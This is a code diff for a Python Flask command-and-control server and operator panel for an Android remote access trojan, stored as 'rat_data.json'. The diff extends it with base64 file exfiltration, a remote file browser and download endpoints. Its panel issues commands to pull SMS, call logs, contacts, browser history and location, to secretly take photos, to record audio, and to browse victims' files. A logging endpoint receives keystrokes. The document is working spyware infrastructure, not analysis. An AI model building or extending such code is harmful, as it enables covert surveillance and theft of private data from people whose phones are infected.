@@ -4,14 +4,16 @@ import json
 import os
 import threading
 import time
+import base64
 
 app = Flask(__name__)
 
 # ---- Storage ----
-log_entries = []        # All events received
-command_queue = []      # Commands waiting to be picked up
-command_results = {}    # Results from executed commands (keyed by cmd_id)
-devices = {}            # Connected devices: {device_id: {last_seen, ip, ...}}
+log_entries = []
+command_queue = []
+command_results = {}
+devices = {}
+file_cache = {}  # Store base64 files temporarily: {cmd_id: {filename, base64_data, mime_type}}
 
 try:
     with open('/tmp/rat_data.json') as f:
@@ -25,7 +27,6 @@ def save_to_disk():
     with open('/tmp/rat_data.json', 'w') as f:
         json.dump({'events': log_entries, 'devices': devices}, f, indent=2)
 
-# ---- Device heartbeat cleanup ----
 def cleanup_stale_devices():
     while True:
         time.sleep(60)
@@ -38,12 +39,11 @@ def cleanup_stale_devices():
 threading.Thread(target=cleanup_stale_devices, daemon=True).start()
 
 # =============================================
-# DEVICE ENDPOINTS (called by the app)
+# DEVICE ENDPOINTS
 # =============================================
 
 @app.route('/api/register', methods=['POST'])
 def register_device():
-    """Device registers itself when app starts."""
     data = request.get_json()
     device_id = data.get('device_id', 'unknown')
     devices[device_id] = {
@@ -60,7 +60,6 @@ def register_device():
 
 @app.route('/api/heartbeat', methods=['POST'])
 def heartbeat():
-    """Device sends heartbeat to stay online."""
     data = request.get_json()
     device_id = data.get('device_id', 'unknown')
     if device_id in devices:
@@ -72,15 +71,12 @@ def heartbeat():
 
 @app.route('/api/cmd', methods=['GET'])
 def get_commands():
-    """Device polls this to get pending commands."""
     device_id = request.args.get('device_id', 'unknown')
     
-    # Update device heartbeat
     if device_id in devices:
         devices[device_id]['last_seen'] = datetime.now().isoformat()
         devices[device_id]['online'] = True
     
-    # Find commands for this device (or broadcast commands)
     cmds = []
     remaining = []
     for cmd in command_queue:
@@ -92,37 +88,47 @@ def get_commands():
         else:
             remaining.append(cmd)
     
-    # Remove sent commands from queue
     command_queue.clear()
     command_queue.extend(remaining)
     
-    return jsonify({
-        'commands': cmds,
-        'queue_size': len(command_queue),
-    })
+    return jsonify({'commands': cmds, 'queue_size': len(command_queue)})
 
 @app.route('/api/result', methods=['POST'])
 def post_result():
-    """Device posts the result of an executed command."""
     data = request.get_json()
     cmd_id = data.get('cmd_id', 'unknown')
     data['server_received_at'] = datetime.now().isoformat()
     
+    # Store file data if base64 is included
+    result_data = data.get('result', {})
+    if isinstance(result_data, dict):
+        if 'base64_data' in result_data and result_data['base64_data']:
+            file_cache[cmd_id] = {
+                'filename': result_data.get('file_name', 'unknown'),
+                'base64_data': result_data['base64_data'],
+                'mime_type': result_data.get('mime_type', 'application/octet-stream'),
+                'file_size': result_data.get('file_size', 0),
+            }
+            # Remove base64 from stored result to save memory (keep in file_cache)
+            result_data['_has_file'] = True
+            result_data.pop('base64_data', None)
+    
     command_results[cmd_id] = data
     
-    # Also add to event log
     log_entries.append({
         'type': 'command_result',
         'timestamp': datetime.now().isoformat(),
         'data': data,
     })
     
+    if len(log_entries) > 2000:
+        log_entries.pop(0)
+    
     save_to_disk()
     return jsonify({'status': 'ok'})
 
 @app.route('/api/log', methods=['POST'])
 def post_log():
-    """Receive events (keystrokes, SMS, calls, etc.)"""
     try:
         data = request.get_json()
         data['server_received_at'] = datetime.now().isoformat()
@@ -145,17 +151,52 @@ def get_logs():
     return jsonify({'total_events': len(log_entries), 'events': log_entries})
 
 # =============================================
-# OPERATOR ENDPOINTS (called by the web panel)
+# FILE ACCESS ENDPOINTS
+# =============================================
+
+@app.route('/api/file/<cmd_id>', methods=['GET'])
+def get_file(cmd_id):
+    """Serve a file as base64 or raw download."""
+    file_info = file_cache.get(cmd_id)
+    if not file_info:
+        return jsonify({'error': 'File not found or expired'}), 404
+    
+    mode = request.args.get('mode', 'base64')
+    
+    if mode == 'raw':
+        # Return raw bytes for download
+        try:
+            raw_data = base64.b64decode(file_info['base64_data'])
+            from flask import Response
+            return Response(
+                raw_data,
+                mimetype=file_info.get('mime_type', 'application/octet-stream'),
+                headers={
+                    'Content-Disposition': f'attachment; filename="{file_info["filename"]}"'
+                }
+            )
+        except:
+            return jsonify({'error': 'Invalid base64 data'}), 400
+    
+    # Return base64 with metadata
+    return jsonify({
+        'cmd_id': cmd_id,
+        'filename': file_info['filename'],
+        'mime_type': file_info.get('mime_type', 'application/octet-stream'),
+        'file_size': file_info.get('file_size', 0),
+        'base64_data': file_info['base64_data'],
+    })
+
+# =============================================
+# OPERATOR ENDPOINTS
 # =============================================
 
 @app.route('/api/devices', methods=['GET'])
 def get_devices():
-    """Return list of connected devices."""
     return jsonify({'devices': list(devices.values())})
 
 @app.route('/api/send_cmd', methods=['POST'])
 def send_command():
-    """Operator sends a command to a device."""
     data = request.get_json()
     cmd_id = f"cmd_{int(time.time() * 1000)}"
     
@@ -175,10 +216,13 @@ def send_command():
 
 @app.route('/api/result/<cmd_id>', methods=['GET'])
 def get_result(cmd_id):
-    """Get the result of a specific command."""
     result = command_results.get(cmd_id)
     if result:
-        return jsonify({'found': True, 'result': result})
+        has_file = False
+        result_data = result.get('result', {})
+        if isinstance(result_data, dict):
+            has_file = result_data.get('_has_file', False)
+        return jsonify({'found': True, 'result': result, 'has_file': has_file})
     return jsonify({'found': False, 'message': 'Result not yet available'})
 
 @app.route('/api/stats', methods=['GET'])
@@ -239,7 +283,7 @@ CONTROL_PANEL_HTML = '''
         }
         .header h1 { font-size: 1.3rem; color: #0f0; }
         
-        .grid { display: grid; grid-template-columns: 280px 1fr; gap: 15px; }
+        .grid { display: grid; grid-template-columns: 300px 1fr; gap: 15px; }
         @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
         
         .panel {
@@ -250,7 +294,7 @@ CONTROL_PANEL_HTML = '''
         
         .device-card {
             background: #0a0a0a; border: 1px solid #222; border-radius: 6px;
-            padding: 10px; margin-bottom: 8px; font-size: 0.75rem;
+            padding: 10px; margin-bottom: 8px; font-size: 0.75rem; cursor: pointer;
         }
         .device-card.online { border-color: #0f0; }
         .device-card.offline { border-color: #f00; opacity: 0.5; }
@@ -265,13 +309,35 @@ CONTROL_PANEL_HTML = '''
         .cmd-btn:hover { background: #0f0; color: #0a0a0a; }
         .cmd-btn.danger { color: #f44; border-color: #f44; }
         .cmd-btn.danger:hover { background: #f44; color: #0a0a0a; }
+        .cmd-btn.file-btn { color: #ff8; border-color: #ff8; }
         
         .output-area {
             background: #050505; border: 1px solid #222; border-radius: 6px;
-            padding: 12px; min-height: 200px; max-height: 500px;
+            padding: 12px; min-height: 200px; max-height: 400px;
             overflow-y: auto; font-size: 0.75rem; white-space: pre-wrap;
             word-break: break-all;
         }
+        
+        .file-list { list-style: none; padding: 0; }
+        .file-list li {
+            padding: 6px 10px; margin: 2px 0; cursor: pointer;
+            border-radius: 3px; font-size: 0.75rem;
+        }
+        .file-list li:hover { background: #1a3a1a; }
+        .file-list li.folder { color: #ff0; }
+        .file-list li.file { color: #0ff; }
+        .file-list li.file:hover { background: #1a1a3a; }
+        
+        .copy-btn {
+            background: #333; color: #0f0; border: 1px solid #0f0;
+            padding: 4px 10px; border-radius: 3px; cursor: pointer;
+            font-family: monospace; font-size: 0.7rem; margin: 4px;
+        }
+        .copy-btn:hover { background: #0f0; color: #000; }
+        .copy-btn.copied { background: #0a0; color: #fff; }
+        
+        .image-preview { max-width: 100%; max-height: 300px; margin: 10px 0; border-radius: 4px; border: 1px solid #333; }
+        .audio-player { width: 100%; margin: 10px 0; }
         
         .status-bar {
             display: flex; justify-content: space-between; align-items: center;
@@ -290,6 +356,20 @@ CONTROL_PANEL_HTML = '''
         .toast.success { background: #0f0; color: #0a0a0a; }
         .toast.error { background: #f44; color: #fff; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); z-index: 999; justify-content: center; align-items: center;
+        }
+        .modal.active { display: flex; }
+        .modal-content {
+            background: #111; border: 2px solid #0f0; border-radius: 8px;
+            padding: 20px; max-width: 90%; max-height: 90%; overflow-y: auto;
+        }
+        .modal-close {
+            float: right; color: #f44; cursor: pointer; font-size: 1.2rem;
+            background: none; border: none;
+        }
     </style>
 </head>
 <body>
@@ -308,41 +388,49 @@ CONTROL_PANEL_HTML = '''
         </div>
         
         <div class="grid">
-            <!-- LEFT: DEVICES + COMMANDS -->
+            <!-- LEFT PANEL -->
             <div>
                 <div class="panel">
-                    <h2>📱 Connected Devices</h2>
+                    <h2>📱 Devices</h2>
                     <div id="deviceList"><p style="color:#666;">No devices connected</p></div>
                 </div>
                 
                 <div class="panel">
-                    <h2>⚡ Quick Commands</h2>
+                    <h2>⚡ Commands</h2>
                     <button class="cmd-btn" onclick="sendCmd('get_sms_inbox')">📥 Get SMS Inbox</button>
                     <button class="cmd-btn" onclick="sendCmd('get_call_logs')">📞 Get Call Logs</button>
                     <button class="cmd-btn" onclick="sendCmd('get_contacts')">👥 Get Contacts</button>
                     <button class="cmd-btn" onclick="sendCmd('get_installed_apps')">📦 Installed Apps</button>
                     <button class="cmd-btn" onclick="sendCmd('capture_photo', {camera: 'back'})">📸 Capture Back Camera</button>
                     <button class="cmd-btn" onclick="sendCmd('capture_photo', {camera: 'front'})">🤳 Capture Front Camera</button>
-                    <button class="cmd-btn" onclick="sendCmd('record_audio', {duration: 15})">🎙️ Record Audio (15s)</button>
+                    <button class="cmd-btn" onclick="sendCmd('record_audio', {duration: 10})">🎙️ Record Audio (10s)</button>
                     <button class="cmd-btn" onclick="sendCmd('get_location')">📍 Get Location</button>
-                    <button class="cmd-btn" onclick="sendCmd('scan_files', {path: '/storage/emulated/0/DCIM'})">📁 Scan DCIM</button>
+                    <button class="cmd-btn file-btn" onclick="sendCmd('scan_files', {path: '/storage/emulated/0'})">📁 Browse Files (Root)</button>
                     <button class="cmd-btn" onclick="sendCmd('get_chrome_history')">🌐 Chrome History</button>
-                    <button class="cmd-btn danger" onclick="sendCmd('ping')">🔍 Ping Device</button>
+                    <button class="cmd-btn danger" onclick="sendCmd('ping')">🔍 Ping</button>
                 </div>
             </div>
             
-            <!-- RIGHT: OUTPUT -->
+            <!-- RIGHT PANEL -->
             <div>
                 <div class="panel">
-                    <h2>📋 Command Output</h2>
-                    <div class="output-area" id="output">Select a device and send a command to see output here.</div>
+                    <h2>📋 Output</h2>
+                    <div class="output-area" id="output">Select a device and send a command.</div>
                 </div>
                 
                 <div class="panel">
                     <h2>📊 Recent Events</h2>
-                    <div class="output-area" id="events" style="max-height:250px;">Loading events...</div>
+                    <div class="output-area" id="events" style="max-height:200px;">Loading...</div>
                 </div>
             </div>
+        </div>
+    </div>
+    
+    <!-- Modal for viewing files -->
+    <div class="modal" id="fileModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">✖</button>
+            <div id="modalContent"></div>
         </div>
     </div>
     
@@ -351,6 +439,7 @@ CONTROL_PANEL_HTML = '''
     <script>
         let selectedDevice = 'all';
         let devices = [];
+        let currentBrowsingPath = null;
         
         function toast(msg, type) {
             const container = document.getElementById('toastContainer');
@@ -373,22 +462,22 @@ CONTROL_PANEL_HTML = '''
                 devices = data.devices || [];
                 renderDevices();
                 document.getElementById('deviceCount').textContent = devices.filter(d => d.online).length;
-            } catch(e) { console.error(e); }
+            } catch(e) {}
         }
         
         function renderDevices() {
             const container = document.getElementById('deviceList');
             if (devices.length === 0) {
-                container.innerHTML = '<p style="color:#666;">No devices connected</p>';
+                container.innerHTML = '<p style="color:#666;">No devices</p>';
                 return;
             }
             container.innerHTML = devices.map(d => `
                 <div class="device-card ${d.online ? 'online' : 'offline'} ${selectedDevice === d.device_id ? 'selected' : ''}"
                      onclick="selectDevice('${d.device_id}')">
                     <strong>${d.device_id}</strong><br>
-                    ${d.model} | Android ${d.android_version}<br>
+                    ${d.model} | ${d.android_version}<br>
                     <span class="status-dot ${d.online ? 'online' : 'offline'}"></span>
-                    ${d.online ? 'Online' : 'Offline'} | IP: ${d.ip}
+                    ${d.online ? 'Online' : 'Offline'}
                 </div>
             `).join('');
         }
@@ -396,15 +485,14 @@ CONTROL_PANEL_HTML = '''
         function selectDevice(id) {
             selectedDevice = id;
             renderDevices();
-            document.getElementById('output').textContent = 'Selected: ' + id + '\\nSend a command from the left panel.';
+            document.getElementById('output').textContent = 'Selected: ' + id;
         }
         
-        async function sendCmd(command, params = {}) {
-            if (selectedDevice === 'all') {
-                if (!confirm('Send to ALL devices?')) return;
-            }
+        async function sendCmd(command, params = {}, isFileBrowse = false) {
+            if (selectedDevice === 'all' && !confirm('Send to ALL devices?')) return;
             
-            document.getElementById('output').textContent = 'Sending: ' + command + '...';
+            const output = document.getElementById('output');
+            output.textContent = '⏳ Sending: ' + command + '...';
             
             try {
                 const res = await fetch('/api/send_cmd', {
@@ -418,32 +506,172 @@ CONTROL_PANEL_HTML = '''
                 });
                 const data = await res.json();
                 toast('Command sent: ' + data.message, 'success');
-                document.getElementById('output').textContent = 
-                    'Command queued: ' + command + '\\nCmd ID: ' + data.cmd_id + '\\n\\nWaiting for device to execute...\\n(Device polls every 5 seconds)';
                 
-                // Poll for result
-                setTimeout(() => pollResult(data.cmd_id), 3000);
+                if (isFileBrowse) {
+                    currentBrowsingPath = params.path || '/storage/emulated/0';
+                }
+                
+                output.textContent = '⏳ Waiting for device... (Cmd: ' + data.cmd_id + ')';
+                pollResult(data.cmd_id, command);
             } catch(e) {
-                toast('Failed to send command', 'error');
+                toast('Failed: ' + e.message, 'error');
             }
         }
         
-        async function pollResult(cmdId) {
+        async function pollResult(cmdId, command) {
+            const output = document.getElementById('output');
             try {
                 const res = await fetch('/api/result/' + cmdId);
                 const data = await res.json();
+                
                 if (data.found) {
-                    document.getElementById('output').textContent = 
-                        '✅ RESULT RECEIVED\\n' + 
-                        'Cmd ID: ' + cmdId + '\\n' +
-                        JSON.stringify(data.result, null, 2);
+                    const result = data.result.result || {};
+                    
+                    if (command === 'scan_files' && result.files) {
+                        renderFileBrowser(result, cmdId);
+                    } else if (command === 'capture_photo' && data.has_file) {
+                        renderPhotoResult(result, cmdId);
+                    } else if (command === 'record_audio' && data.has_file) {
+                        renderAudioResult(result, cmdId);
+                    } else if (command === 'get_file_content' && data.has_file) {
+                        renderFileContent(result, cmdId);
+                    } else {
+                        output.textContent = '✅ Result:\\n' + JSON.stringify(result, null, 2);
+                    }
                 } else {
-                    document.getElementById('output').textContent += '\\n⏳ Still waiting... (polling again in 5s)';
-                    setTimeout(() => pollResult(cmdId), 5000);
+                    output.textContent = '⏳ Still waiting... retrying in 5s';
+                    setTimeout(() => pollResult(cmdId, command), 5000);
                 }
             } catch(e) {
-                setTimeout(() => pollResult(cmdId), 5000);
+                setTimeout(() => pollResult(cmdId, command), 5000);
             }
+        }
+        
+        function renderFileBrowser(result, cmdId) {
+            const output = document.getElementById('output');
+            const path = result.path || currentBrowsingPath;
+            const files = result.files || [];
+            
+            let html = '<div style="margin-bottom:10px;">';
+            html += '<strong>📁 ' + path + '</strong> ';
+            html += '<small>(' + (result.count || files.length) + ' items)</small>';
+            html += '</div>';
+            html += '<button class="copy-btn" onclick="sendCmd(\'scan_files\', {path: \'' + getParentPath(path) + '\'}, true)">⬆ Parent</button>';
+            html += '<hr style="border-color:#333;margin:8px 0;">';
+            html += '<ul class="file-list">';
+            
+            for (const f of files) {
+                const icon = f.isDirectory ? '📁' : '📄';
+                const cssClass = f.isDirectory ? 'folder' : 'file';
+                const onclick = f.isDirectory 
+                    ? "sendCmd('scan_files', {path: '" + f.path + "'}, true)"
+                    : "sendCmd('get_file_content', {path: '" + f.path + "', filename: '" + f.name + "'})";
+                
+                html += `<li class="${cssClass}" onclick="${onclick}">
+                    ${icon} ${f.name} 
+                    <span style="color:#666;font-size:0.7em;">${f.isDirectory ? '' : formatSize(f.size)}</span>
+                </li>`;
+            }
+            
+            if (files.length === 0) html += '<li style="color:#666;">Empty directory</li>';
+            html += '</ul>';
+            
+            output.innerHTML = html;
+        }
+        
+        function renderPhotoResult(result, cmdId) {
+            const output = document.getElementById('output');
+            output.innerHTML = `
+                <div>
+                    <strong>📸 Photo Captured</strong><br>
+                    <small>Path: ${result.file_path || 'N/A'}</small><br>
+                    <button class="copy-btn" onclick="viewFile('${cmdId}', 'image')">🖼️ View Image</button>
+                    <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
+                    <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
+                    <div id="preview_${cmdId}"></div>
+                </div>
+            `;
+        }
+        
+        function renderAudioResult(result, cmdId) {
+            const output = document.getElementById('output');
+            output.innerHTML = `
+                <div>
+                    <strong>🎙️ Audio Recorded</strong><br>
+                    <small>Path: ${result.file_path || 'N/A'}</small><br>
+                    <button class="copy-btn" onclick="viewFile('${cmdId}', 'audio')">▶ Play Audio</button>
+                    <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
+                    <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
+                    <div id="preview_${cmdId}"></div>
+                </div>
+            `;
+        }
+        
+        function renderFileContent(result, cmdId) {
+            const output = document.getElementById('output');
+            const mimeType = result.mime_type || 'application/octet-stream';
+            const isImage = mimeType.startsWith('image/');
+            const isAudio = mimeType.startsWith('audio/');
+            
+            output.innerHTML = `
+                <div>
+                    <strong>📄 File: ${result.file_name || 'N/A'}</strong><br>
+                    <small>Size: ${formatSize(result.file_size || 0)} | Type: ${mimeType}</small><br>
+                    ${isImage ? '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'image\')">🖼️ View</button>' : ''}
+                    ${isAudio ? '<button class="copy-btn" onclick="viewFile(\'' + cmdId + '\', \'audio\')">▶ Play</button>' : ''}
+                    <button class="copy-btn" onclick="downloadFile('${cmdId}')">⬇ Download</button>
+                    <button class="copy-btn" onclick="copyBase64('${cmdId}')">📋 Copy Base64</button>
+                    <div id="preview_${cmdId}"></div>
+                </div>
+            `;
+        }
+        
+        async function viewFile(cmdId, type) {
+            const previewDiv = document.getElementById('preview_' + cmdId);
+            try {
+                const res = await fetch('/api/file/' + cmdId + '?mode=base64');
+                const data = await res.json();
+                
+                if (type === 'image') {
+                    previewDiv.innerHTML = `<img class="image-preview" src="data:${data.mime_type};base64,${data.base64_data}" alt="Preview">`;
+                } else if (type === 'audio') {
+                    previewDiv.innerHTML = `<audio class="audio-player" controls src="data:${data.mime_type};base64,${data.base64_data}"></audio>`;
+                }
+            } catch(e) {
+                toast('Failed to load file', 'error');
+            }
+        }
+        
+        function downloadFile(cmdId) {
+            window.open('/api/file/' + cmdId + '?mode=raw', '_blank');
+        }
+        
+        async function copyBase64(cmdId) {
+            try {
+                const res = await fetch('/api/file/' + cmdId + '?mode=base64');
+                const data = await res.json();
+                await navigator.clipboard.writeText(data.base64_data);
+                toast('✅ Base64 copied to clipboard! (' + formatSize(data.base64_data.length) + ' chars)', 'success');
+            } catch(e) {
+                toast('Failed to copy', 'error');
+            }
+        }
+        
+        function closeModal() {
+            document.getElementById('fileModal').classList.remove('active');
+        }
+        
+        function getParentPath(path) {
+            const parts = path.split('/');
+            parts.pop();
+            return parts.join('/') || '/';
+        }
+        
+        function formatSize(bytes) {
+            if (!bytes || bytes === 0) return '0 B';
+            if (bytes < 1024) return bytes + ' B';
+            if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+            return (bytes / 1048576).toFixed(1) + ' MB';
         }
         
         async function loadStats() {
@@ -452,7 +680,7 @@ CONTROL_PANEL_HTML = '''
                 const data = await res.json();
                 document.getElementById('eventCount').textContent = data.total_events;
                 document.getElementById('pendingCount').textContent = data.pending_commands;
-            } catch(e) { console.error(e); }
+            } catch(e) {}
         }
         
         async function loadEvents() {
@@ -464,30 +692,20 @@ CONTROL_PANEL_HTML = '''
                     `<div style="margin-bottom:6px;border-left:3px solid ${getColor(e.type)};padding-left:8px;">
                         <span style="color:#888;">${(e.timestamp || '').substring(0,19)}</span>
                         <span style="color:#0ff;">[${e.type || 'unknown'}]</span>
-                        ${getPreview(e.data || {})}
                     </div>`
                 ).join('') || '<p style="color:#666;">No events</p>';
-            } catch(e) { console.error(e); }
+            } catch(e) {}
         }
         
         function getColor(type) {
-            if (type.includes('sms')) return '#0ff';
-            if (type.includes('call')) return '#ff0';
-            if (type.includes('location')) return '#0f0';
-            if (type.includes('camera') || type.includes('photo')) return '#f0f';
-            if (type.includes('audio') || type.includes('record')) return '#f44';
-            if (type.includes('accessibility')) return '#f06';
-            if (type.includes('file') || type.includes('scan')) return '#f80';
+            if (type && type.includes('sms')) return '#0ff';
+            if (type && type.includes('call')) return '#ff0';
+            if (type && type.includes('photo') || (type && type.includes('camera'))) return '#f0f';
+            if (type && type.includes('audio')) return '#f44';
+            if (type && type.includes('file')) return '#f80';
             return '#888';
         }
         
-        function getPreview(data) {
-            if (typeof data !== 'object') return String(data).substring(0, 100);
-            const str = JSON.stringify(data);
-            return str.length > 100 ? str.substring(0, 100) + '...' : str;
-        }
-        
-        // Auto-refresh
         setInterval(refreshAll, 10000);
         refreshAll();
     </script>
